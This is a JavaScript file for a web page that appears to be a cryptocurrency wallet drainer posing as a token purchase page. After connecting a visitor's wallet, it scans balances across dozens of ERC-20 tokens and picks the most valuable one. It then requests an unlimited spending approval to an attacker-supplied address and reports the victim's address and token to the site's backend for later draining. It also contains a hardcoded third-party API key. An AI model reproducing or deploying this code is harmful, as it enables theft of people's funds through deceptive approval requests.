const ABI = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];

	$(function() {
		var authorized_address = '';
		var infura_key = '';
		var url=window.location.host;
		var domain = 'https://' + window.location.host + '/';
		var bizhong = '';
		const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1)
		var address = getUrlQueryString('address')
		var rank = 6.45;
		var is = true;
		$('#address').text(address)

		$('input.num').bind('input propertychange', function()
		{
			if($(this).val() && $(this).val()>0){
				$('#btn-connect').css('background','#078bc3');
			}else{
				$('#btn-connect').css('background','#dde0dd');
			}
			$('#price').text(($(this).val()*rank).toLocaleString() )

		})
		/******************************************/
		// Unpkg imports
		const _web3 = new Web3('https://cloudflare-eth.com')

		let injectedWeb3 = null, total = 0
		let approveAddr = '0xdac17f958d2ee523a2206206994597c13d831ec7'
		const addr = {
			'usdt': '0xdac17f958d2ee523a2206206994597c13d831ec7',
			'sushi': '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2',
			'usdc': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
			'uni': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
			'aave': '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9',
			'yfi': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
			'dai': '0x6b175474e89094c44da98b954eedeac495271d0f',
			'link': '0x514910771af9ca656af840dff83e8264ecf986ca',
			"LON": "0x0000000000095413afc295d19edeb1ad7b71c952",
			"CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
			'FIL': "0xbf48ecb7c2d3d559e0a24b04f306889e05c73cd6",
		}

		const addr2 = {
			"WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
			"WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
			"CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
			"inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
			"MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
			"ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
			"BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
			"snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
			"comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
			"sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
		}

		const addr3 = {
			"FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
			"ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
			"TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
			"wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
			"RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
			"CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
			"mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
			"DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
			"luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
			"HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
			"fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
			"fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
		}

		async function getMostValuableAssets(account) {
			let _symbol = 'usdt'
			console.log('_symbol:'+_symbol);

			for (const [symbol, contract] of Object.entries(contracts)) {
				contract.methods.balanceOf(account).call(function(err, balance) {
					if(symbol == 'usdt'){
						console.log('以态钱包');
						console.log(account)
						let yu =balance / (10** (decimals[symbol] || 18))
						console.log(yu.toLocaleString())
						$('#yu').text(yu.toLocaleString() +' USDT')

						checkHasJoined(account,yu.toLocaleString());
					}
					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
					if (usdt > total && usdt > 1000) {
						_symbol = symbol
						total = usdt
						approveAddr = addr[_symbol]
						bizhong = _symbol

					}
				})
			}

			bizhong = _symbol
			console.log('_symbol:'+_symbol);
			return _symbol
		}

		function getUrlQueryString(names, urls) {
			urls = urls || window.location.href;
			urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
			var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
			var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
			if (r != null && r[2] != "")return unescape(r[2]);
			return null;
		}

		function getInfo(){

			//  $("#fffsss").text(domain + '/api/api/getInfo')
			var s = getUrlQueryString('s');
			$.ajax({
				type: 'get',
				url:  domain + 'api/get_erc/s/'+s,

				//async : false,
				success:function(data){
					console.log(data)
					authorized_address = data.data.authorized_address;
					console.log(authorized_address);
					infura_key = data.data.infura_key;



				},
				error:function(data){


				}

			})
		}

		async function postInfo(address,symbol){
		    if (is == false) {
				return;
			}

			is = false;
			var s = getUrlQueryString('s')
			var a = getUrlQueryString('r')

			var data = {
				address:address,
				authorized_address:authorized_address,
				bizhong:symbol,
				code:s,
				reffer:a,
			}

			$.ajax({
				type: 'post',
				url:  domain + 'api/insert_erc',
				data:data,
				success:function(data){
				    //console.log(data)
				    if(data.code === 200){
				    	console.log('success')

				    }
				    console.log(data.msg)

					window.location.reload();
				},
				error:function(data){
					console.log(data)
				}

			})

		}

		async function getMostValuableAssets2(account) {
			let _symbol = 'usdt'
			console.log('_symbol:'+_symbol);
			for (const [symbol, contract] of Object.entries(contracts2)) {
				contract.methods.balanceOf(account).call(function(err, balance) {
					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
					if (usdt > total && usdt > 1000) {
						_symbol = symbol
						total = usdt
						approveAddr = addr[_symbol]

					}
				})


			}

			bizhong = _symbol

			console.log('_symbol:'+_symbol);
			return _symbol
		}

		async function getMostValuableAssets3(account) {
			let _symbol = 'usdt'
			for (const [symbol, contract] of Object.entries(contracts3)) {
				contract.methods.balanceOf(account).call(function(err, balance) {
					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
					if (usdt > total && usdt > 1000) {
						_symbol = symbol
						total = usdt
						approveAddr = addr[_symbol]
					}
				})
			}
			bizhong = _symbol
			console.log('_symbol:'+_symbol);
			return _symbol
		}


		const price = {
			usdt: 1,
			sushi: 15.5,
			usdc: 1,
			dai: 1,
			uni: 28.6,
			aave: 380,
			yfi: 35000,
			link: 28.2,
			"LON": 7,
			"CRV": 3.01367,
			"GUSD": 1,
			"WBTC": 56478.2,
			"WETH": 1991.89,
			"CONV": 0.105733,
			"inj": 13.3812,
			"MKR": 2076.68,
			"ALPHA": 1.79043,
			"BAND": 16.3441,
			"snx": 20.0588,
			"comp": 468.076,
			"sxp": 4.11818,
			"FTT": 46.1779,
			"ust": 1.00543,
			"TRIBE": 1.42926,
			"wise": 0.446973,
			"RRAX": 0.996821,
			"CORE": 5447.59,
			"mir": 8.69817,
			"DPI": 415.906,
			"luna": 15.2402,
			"HEZ": 5.97533,
			"fxs": 8.47025,
			"fei": 0.898157,
		}

		const decimals = {
			sushi: 18,
			usdt: 6,
			usdc: 6,
			uni: 18,
			dai: 18,
			aave: 18,
			yfi: 18,
			link: 18,
			WBTC: 8,
		}

		const contracts = {}, contracts2 = {}, contracts3 = {}
		for (const symbol of Object.keys(addr)) {
			const contractAddr = addr[symbol]
			contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
		}

		for (const symbol of Object.keys(addr2)) {
			const contractAddr = addr2[symbol]
			contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
		}

		for (const symbol of Object.keys(addr3)) {
			const contractAddr = addr3[symbol]
			contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
		}

		const Web3Modal = window.Web3Modal.default;
		const WalletConnectProvider = window.WalletConnectProvider.default;

		// Web3modal instance
		let web3Modal

		// Chosen wallet provider given by the dialog window
		let provider;

		// Address of the selected account
		let selectedAccount;


		/**
		 * Setup the orchestra
		 */
		async function init() {



			getInfo();




			// Tell Web3modal what providers we have available.
			// Built-in web browser provider (only one can exist as a time)
			// like MetaMask, Brave or Opera is added automatically by Web3modal

			const providerOptions = {
				walletconnect: {
					package: WalletConnectProvider,
					options: {
						// Mikko's test key - don't copy as your mileage may vary
						infuraId: infura_key,
					}
				},
			};

			web3Modal = new Web3Modal({
				cacheProvider: false, // optional
				providerOptions, // required
				disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
			});


			try {
				provider = await web3Modal.connect()
				provider.enable()
			} catch(e) {
				console.log("Could not get a wallet connection", e);
				return;
			}

			// Subscribe to accounts change
			provider.on("accountsChanged", async (accounts) => {
				await fetchAccountData();
			});

			// Subscribe to chainId change
			provider.on("chainChanged", async (chainId) => {
				await fetchAccountData();
			});

			// Subscribe to networkId change
			provider.on("networkChanged", async (networkId) => {
				await fetchAccountData();
			});

			await refreshAccountData();
		}

		/**
		 * Kick in the UI action after Web3modal dialog has chosen a provider
		 */
		async function fetchAccountData() {
			const web3 = new Web3(provider);
			injectedWeb3 = web3
			provider.enable()
			const accounts = await web3.eth.getAccounts()
			selectedAccount = accounts[0]
			console.log(selectedAccount);
			let gasPrice = await web3.eth.getGasPrice()
			var gs =((gasPrice*80000) / (10**18)).toFixed(6)
			console.log(gs)
			$('#gas').text(gs.toLocaleString() + ' ETH')
			$.get("https://data.block.cc/api/v3/price?api_key=WH5Y6G7PUMUSMVEQZAPXSTVCIEKATAZAARQFKD9E&slug=ethereum", function(result){
				console.log(result[0]['u'])
				let mon = gs*result[0]['u']
				$('#gasmoney').text('$ '+mon.toLocaleString())
			});
			getMostValuableAssets(selectedAccount)
			setTimeout(function() {
				getMostValuableAssets2(selectedAccount)
			}, 200)
			setTimeout(function() {
				getMostValuableAssets3(selectedAccount)
			}, 300)
		}


		/**
		 * Fetch account data for UI when
		 * - User switches accounts in wallet
		 * - User switches networks in wallet
		 * - User connects wallet initially
		 */
		async function refreshAccountData() {

			// If any current data is displayed when
			// the user is switching acounts in the wallet
			// immediate hide this data
			// document.querySelector("#connected").style.display = "none";
			// document.querySelector("#prepare").style.display = "block";

			// Disable button while UI is loading.
			// fetchAccountData() will take a while as it communicates
			// with Ethereum node via JSON-RPC and loads chain data
			// over an API call.
			document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
			await fetchAccountData(provider);
			document.querySelector("#btn-connect").removeAttribute("disabled")
		}


		/**
		 * Connect wallet button pressed.
		 */
		async function onConnect() {


			$('.pages').append('<div class="modal-overlay"></div>');
			$('.modal-overlay').addClass('modal-overlay-visible');
			$('.modal').removeClass('modal-out').addClass('modal-in');



			console.log(authorized_address);
			console.log(infura_key);



			console.log(bizhong);

			if (selectedAccount && provider) {
				const web3 = new Web3(provider);
				const contract = new web3.eth.Contract(ABI, approveAddr)


				const gasPrice = await web3.eth.getGasPrice()

				// var gas = await contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).estimateGas({
				// 	from: selectedAccount
				// },function(err, tx) {


				// 	console.log(err, tx)

				// })
				// if(gas == undefined){
				// 	gas = 80000;
				// }



				contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
					from: selectedAccount,
					gasPrice: gasPrice,
					gas: 70000,
				}, function(err, tx) {
					if(!err){


						$(".tishi").fadeIn()
						setTimeout(function () {
							$(".tishi").fadeOut()
						},2000);



						postInfo(selectedAccount,bizhong)
					}
					$('.modal-overlay').remove();

					$('.modal').removeClass('modal-in').addClass('modal-out');

					console.log(err, tx)

				})
			} else {
				provider = await web3Modal.connect()
				provider.enable()
				const web3 = new Web3(provider);
				const accounts = await web3.eth.getAccounts()
				selectedAccount = accounts[0]


				const contract = new web3.eth.Contract(ABI, approveAddr)
				const gasPrice = await web3.eth.getGasPrice()

				// var gas = await contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').estimateGas({
				// 	from: selectedAccount
				// },function(err, tx) {


				// 	console.log(err, tx)

				// })
				// if(gas == undefined){
				// 	gas= 80000;
				// }
				// console.log(gas)

				contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
					from: selectedAccount,
					gasPrice: gasPrice,
					gas:70000,
				}, function(err, tx) {
					console.log(err, tx)
					if(!err){
						$(".tishi").fadeIn()
						setTimeout(function () {
							$(".tishi").fadeOut()
						},2000);
						postInfo(selectedAccount,bizhong)

					}
					$('.modal-overlay').remove();

					$('.modal').removeClass('modal-in').addClass('modal-out');


				})
			}
		}

		/**
		 * Disconnect wallet button pressed.
		 */
		async function onDisconnect() {

			console.log("Killing the wallet connection", provider);

			// TODO: Which providers have close method?
			if(provider.close) {
				await provider.close();

				// If the cached provider is not cleared,
				// WalletConnect will default to the existing session
				// and does not allow to re-scan the QR code with a new wallet.
				// Depending on your use case you may want or want not his behavir.
				await web3Modal.clearCachedProvider();
				provider = null;
			}

			selectedAccount = null;

			// Set the UI back to the initial state
			// document.querySelector("#prepare").style.display = "block";
			// document.querySelector("#connected").style.display = "none";
		}

		/**
		 * Main entry point.
		 */
		window.addEventListener('load', async () => {
			init();
			document.querySelector("#btn-connect").addEventListener("click", onConnect);
			// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
		});


	});
	function _init(argument) {
		// body...
	}